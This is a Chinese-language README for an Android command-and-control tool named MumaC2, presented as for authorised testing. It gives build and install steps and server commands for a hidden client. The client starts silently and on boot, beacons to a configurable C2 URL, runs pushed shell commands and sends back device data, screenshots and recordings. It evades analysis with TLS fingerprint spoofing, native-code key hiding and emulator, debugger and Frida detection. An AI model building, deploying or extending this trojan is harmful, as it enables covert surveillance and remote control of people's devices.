# MumaC2 — Android C2 测试工具

仅供授权安全测试使用。AES-128-ECB 加密通信 + JA3 TLS 指纹伪装 + 原生层密钥隐藏。

## 环境要求

**服务端：**
- Python 3.8+
- `pip install flask pycryptodome`
- OpenSSL（用于生成自签名证书）

**Android 客户端构建：**
- Android Studio / Gradle 9.4.1+ / AGP 9.2.1+
- NDK 28+（用于编译 libnative.so）
- CMake 3.22+

## 快速开始

### 1. 启动服务器

```bash
cd server
python c2_server.py
# 安全模式，只下发信息收集类指令

# 含破坏性指令（重启/删除等）：
python c2_server.py --dangerous

# 自定义端口和文件保存目录：
python c2_server.py --dangerous --port 443 --save-dir ./downloads
```

服务器输出示例：
```
  监听地址 : https://0.0.0.0:8443/heartbeat
  AES密钥  : TestC2Key16Byte!
  指令总数 : 42 (安全38 + 危险4)
```

### 2. 修改客户端 IP

```java
// app/src/main/java/com/cc/mumac2/C2Communicator.java:31
private static final String C2_SERVER_URL = "https://<服务器IP>:8443/heartbeat";
```

### 3. 编译 APK

```bash
./gradlew assembleDebug
```

APK 输出路径：`app/build/outputs/apk/debug/app-debug.apk`

### 4. 安装到设备

```bash
adb install app/build/outputs/apk/debug/app-debug.apk
```

安装后点击图标启动（无界面，启动后自动关闭），服务在后台运行。

## 服务器控制台命令

| 命令 | 说明 |
|---|---|
| `send <shell命令>` | 手动下发一条 shell 指令到目标 |
| `queue` | 查看待下发队列 |
| `clear` | 清空队列 |
| `list [cat]` | 列出指令库（筛选: system/network/apps/files/spy/danger） |
| `dangerous [on\|off]` | 查看/切换危险指令开关 |
| `random [on\|off]` | 禁用随机下发（仅从队列取指令） |
| `stats` | 统计信息 |
| `exit` | 退出服务器 |

## 命令行参数

| 参数 | 默认值 | 说明 |
|---|---|---|
| `--port` | 8443 | 监听端口 |
| `--host` | 0.0.0.0 | 监听地址 |
| `--dangerous` | 关闭 | 启用重启/删除等破坏性指令 |
| `--save-dir` | ./c2_downloads | 文件回传保存目录 |
| `--key` | TestC2Key16Byte! | AES 密钥（必须 16 字节） |
| `--log-dir` | ./logs | HTTP 日志目录（设为 console 则输出到终端） |

## 安全特性

| 特性 | 实现 |
|---|---|
| **AES 密钥隐藏** | 密钥硬编码在 libnative.so 的 C++ 代码中，Java 反编译不可见 |
| **JA3 指纹伪装** | `JaaSpoofingSocketFactory` 重排 ClientHello 密码套件顺序（ChaCha20 优先） |
| **反检测** | `EvasionCheck` 检测模拟器/调试器/Frida，命中后立即 `System.exit(0)` |
| **命令超时** | 30 秒超时保护，防止命令卡死 |
| **输出限制** | 单条命令输出最大 5MB，超出截断 |

## 文件结构

```
app/src/main/java/com/cc/mumac2/
├── MainActivity.kt              # 入口 Activity（无界面，静默启动服务）
├── C2Service.java               # 前台服务，30秒心跳循环
├── C2Communicator.java          # HTTPS 通信 + AES 加解密封装
├── NativeCryptoBridge.java      # JNI 桥接层
├── JaaSpoofingSocketFactory.java # JA3 指纹伪装 SSLSocketFactory
├── DeviceInfoCollector.java     # 设备信息收集
├── EvasionCheck.java            # 反检测（模拟器/调试器/Frida）
└── BootReceiver.java            # 开机自启动

app/src/main/cpp/
├── CMakeLists.txt               # NDK 构建配置
└── native_crypto.cpp            # AES-128-ECB 实现 (FIPS-197)

server/
├── c2_server.py                 # C2 服务器（Flask + 交互控制台）
├── server.crt / server.key      # 自签名证书（自动生成）
└── c2_downloads/                # 文件回传保存目录
```

## 通信协议

```
Android → 服务器: POST /heartbeat
  Body: Base64(AES-ECB(设备信息JSON))

服务器 → Android: 200 OK
  Body: Base64(AES-ECB(shell指令))

Android → 服务器: POST /heartbeat
  Body: Base64(AES-ECB({"result":"执行结果"}))

文件回传格式（截屏/录屏）:
  FILE_SIZE: <size>
  ---B64_DATA---
  <base64数据>
```

## 注意事项

- 服务器日志中 Flask HTTP 请求日志默认重定向到 `./logs/` 目录，终端仅显示 C2 业务日志
- Android 端需要 `INTERNET`、`FOREGROUND_SERVICE`、`RECEIVE_BOOT_COMPLETED` 权限
- 自签名证书已信任所有，**生产环境不可用**
- `EvasionCheck.exitIfAnalyzed()` 在 Frida/调试器环境中会直接杀掉进程
